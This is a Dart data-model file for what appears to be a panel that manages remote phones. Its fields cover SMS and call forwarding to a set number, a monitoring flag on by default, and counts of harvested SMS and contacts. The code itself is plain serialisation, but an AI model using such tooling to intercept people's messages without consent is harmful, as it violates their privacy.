class DeviceSettings {
  final bool smsForwardEnabled;
  final String? forwardNumber;
  final bool callForwardEnabled;
  final String? callForwardNumber;
  final bool monitoringEnabled;

  DeviceSettings({
    required this.smsForwardEnabled,
    this.forwardNumber,
    required this.callForwardEnabled,
    this.callForwardNumber,
    required this.monitoringEnabled,
  });

  factory DeviceSettings.fromJson(Map<String, dynamic> json) {
    return DeviceSettings(
      smsForwardEnabled: json['sms_forward_enabled'] ?? false,
      forwardNumber: json['forward_number'],
      callForwardEnabled: json['call_forward_enabled'] ?? false,
      callForwardNumber: json['call_forward_number'],
      monitoringEnabled: json['monitoring_enabled'] ?? true,
    );
  }

  Map<String, dynamic> toJson() {
    return {
      'sms_forward_enabled': smsForwardEnabled,
      'forward_number': forwardNumber,
      'call_forward_enabled': callForwardEnabled,
      'call_forward_number': callForwardNumber,
      'monitoring_enabled': monitoringEnabled,
    };
  }
}

class DeviceStats {
  final int totalSms;
  final int totalContacts;
  final DateTime? lastSmsSyncDate;
  final DateTime? lastContactSyncDate;

  DeviceStats({
    required this.totalSms,
    required this.totalContacts,
    this.lastSmsSyncDate,
    this.lastContactSyncDate,
  });

  factory DeviceStats.fromJson(Map<String, dynamic> json) {
    return DeviceStats(
      totalSms: json['total_sms'] ?? 0,
      totalContacts: json['total_contacts'] ?? 0,
      lastSmsSyncDate: json['last_sms_sync'] != null
          ? DateTime.parse(json['last_sms_sync'])
          : null,
      lastContactSyncDate: json['last_contact_sync'] != null
          ? DateTime.parse(json['last_contact_sync'])
          : null,
    );
  }
}

class Device {
  final String deviceId;
  final String model;
  final String manufacturer;
  final String osVersion;
  final String appVersion;
  final String status;
  final int batteryLevel;
  final DateTime lastPing;
  final DeviceSettings settings;
  final DeviceStats stats;
  final DateTime registeredAt;

  final String? brand;
  final String? deviceName;
  final String? product;
  final String? hardware;
  final String? board;
  final String? display;
  final String? fingerprint;
  final String? host;
  final int? sdkInt;
  final List<String>? supportedAbis;

  final String? batteryState;
  final bool? isCharging;

  final int? totalStorageMb;
  final int? freeStorageMb;
  final int? storageUsedMb;
  final String? storagePercentFree;

  final int? totalRamMb;
  final int? freeRamMb;
  final int? ramUsedMb;
  final String? ramPercentFree;

  final String? networkType;
  final String? ipAddress;

  final bool? isRooted;
  final String? screenResolution;
  final double? screenDensity;

  final List<Map<String, dynamic>>? simInfo;

  Device({
    required this.deviceId,
    required this.model,
    required this.manufacturer,
    required this.osVersion,
    required this.appVersion,
    required this.status,
    required this.batteryLevel,
    required this.lastPing,
    required this.settings,
    required this.stats,
    required this.registeredAt,

    this.brand,
    this.deviceName,
    this.product,
    this.hardware,
    this.board,
    this.display,
    this.fingerprint,
    this.host,
    this.sdkInt,
    this.supportedAbis,
    this.batteryState,
    this.isCharging,
    this.totalStorageMb,
    this.freeStorageMb,
    this.storageUsedMb,
    this.storagePercentFree,
    this.totalRamMb,
    this.freeRamMb,
    this.ramUsedMb,
    this.ramPercentFree,
    this.networkType,
    this.ipAddress,
    this.isRooted,
    this.screenResolution,
    this.screenDensity,
    this.simInfo,
  });

  factory Device.fromJson(Map<String, dynamic> json) {
    return Device(
      deviceId: json['device_id'] ?? '',
      model: json['model'] ?? 'Unknown',
      manufacturer: json['manufacturer'] ?? 'Unknown',
      osVersion: json['os_version'] ?? 'Unknown',
      appVersion: json['app_version'] ?? '1.0.0',
      status: json['status'] ?? 'offline',
      batteryLevel: json['battery_level'] ?? 0,
      lastPing: json['last_ping'] != null
          ? DateTime.parse(json['last_ping'])
          : DateTime.now(),
      settings: DeviceSettings.fromJson(json['settings'] ?? {}),
      stats: DeviceStats.fromJson(json['stats'] ?? {}),
      registeredAt: DateTime.parse(json['registered_at']),

      brand: json['brand'],
      deviceName: json['device'],
      product: json['product'],
      hardware: json['hardware'],
      board: json['board'],
      display: json['display'],
      fingerprint: json['fingerprint'],
      host: json['host'],
      sdkInt: json['sdk_int'],
      supportedAbis: json['supported_abis'] != null
          ? List<String>.from(json['supported_abis'])
          : null,
      batteryState: json['battery_state'],
      isCharging: json['is_charging'],
      totalStorageMb: json['total_storage_mb'],
      freeStorageMb: json['free_storage_mb'],
      storageUsedMb: json['storage_used_mb'],
      storagePercentFree: json['storage_percent_free'],
      totalRamMb: json['total_ram_mb'],
      freeRamMb: json['free_ram_mb'],
      ramUsedMb: json['ram_used_mb'],
      ramPercentFree: json['ram_percent_free'],
      networkType: json['network_type'],
      ipAddress: json['ip_address'],
      isRooted: json['is_rooted'],
      screenResolution: json['screen_resolution'],
      screenDensity: json['screen_density']?.toDouble(),
      simInfo: json['sim_info'] != null
          ? List<Map<String, dynamic>>.from(
              json['sim_info'].map((x) => Map<String, dynamic>.from(x)))
          : null,
    );
  }

  Map<String, dynamic> toJson() {
    return {
      'device_id': deviceId,
      'model': model,
      'manufacturer': manufacturer,
      'os_version': osVersion,
      'app_version': appVersion,
      'status': status,
      'battery_level': batteryLevel,
      'last_ping': lastPing.toIso8601String(),
      'settings': settings.toJson(),
      'registered_at': registeredAt.toIso8601String(),

      if (brand != null) 'brand': brand,
      if (deviceName != null) 'device': deviceName,
      if (product != null) 'product': product,
      if (hardware != null) 'hardware': hardware,
      if (board != null) 'board': board,
      if (display != null) 'display': display,
      if (fingerprint != null) 'fingerprint': fingerprint,
      if (host != null) 'host': host,
      if (sdkInt != null) 'sdk_int': sdkInt,
      if (supportedAbis != null) 'supported_abis': supportedAbis,
      if (batteryState != null) 'battery_state': batteryState,
      if (isCharging != null) 'is_charging': isCharging,
      if (totalStorageMb != null) 'total_storage_mb': totalStorageMb,
      if (freeStorageMb != null) 'free_storage_mb': freeStorageMb,
      if (storageUsedMb != null) 'storage_used_mb': storageUsedMb,
      if (storagePercentFree != null) 'storage_percent_free': storagePercentFree,
      if (totalRamMb != null) 'total_ram_mb': totalRamMb,
      if (freeRamMb != null) 'free_ram_mb': freeRamMb,
      if (ramUsedMb != null) 'ram_used_mb': ramUsedMb,
      if (ramPercentFree != null) 'ram_percent_free': ramPercentFree,
      if (networkType != null) 'network_type': networkType,
      if (ipAddress != null) 'ip_address': ipAddress,
      if (isRooted != null) 'is_rooted': isRooted,
      if (screenResolution != null) 'screen_resolution': screenResolution,
      if (screenDensity != null) 'screen_density': screenDensity,
      if (simInfo != null) 'sim_info': simInfo,
    };
  }

  bool get isOnline => status == 'online';
  bool get isOffline => !isOnline;
  bool get isActive => stats.totalSms > 0 || stats.totalContacts > 0;
  bool get isPending => !isActive;

  String get fullDeviceName {
    if (brand != null && model != null) {
      return '$brand $model';
    }
    return model;
  }

  bool get hasLowBattery => batteryLevel < 20;
  bool get hasLowStorage {
    if (storagePercentFree == null) return false;
    final percent = double.tryParse(storagePercentFree!) ?? 100;
    return percent < 10;
  }

  bool get hasLowRam {
    if (ramPercentFree == null) return false;
    final percent = double.tryParse(ramPercentFree!) ?? 100;
    return percent < 10;
  }

  String get primaryCarrier {
    if (simInfo == null || simInfo!.isEmpty) return 'No SIM';
    return simInfo![0]['carrierName'] ?? 'Unknown';
  }

  bool get isDualSim => simInfo != null && simInfo!.length > 1;

  String get storageInfo {
    if (freeStorageMb == null || totalStorageMb == null) return 'Unknown';
    final freeGB = (freeStorageMb! / 1024).toStringAsFixed(1);
    final totalGB = (totalStorageMb! / 1024).toStringAsFixed(1);
    return '$freeGB / $totalGB GB';
  }

  String get ramInfo {
    if (freeRamMb == null || totalRamMb == null) return 'Unknown';
    final freeGB = (freeRamMb! / 1024).toStringAsFixed(1);
    final totalGB = (totalRamMb! / 1024).toStringAsFixed(1);
    return '$freeGB / $totalGB GB';
  }
}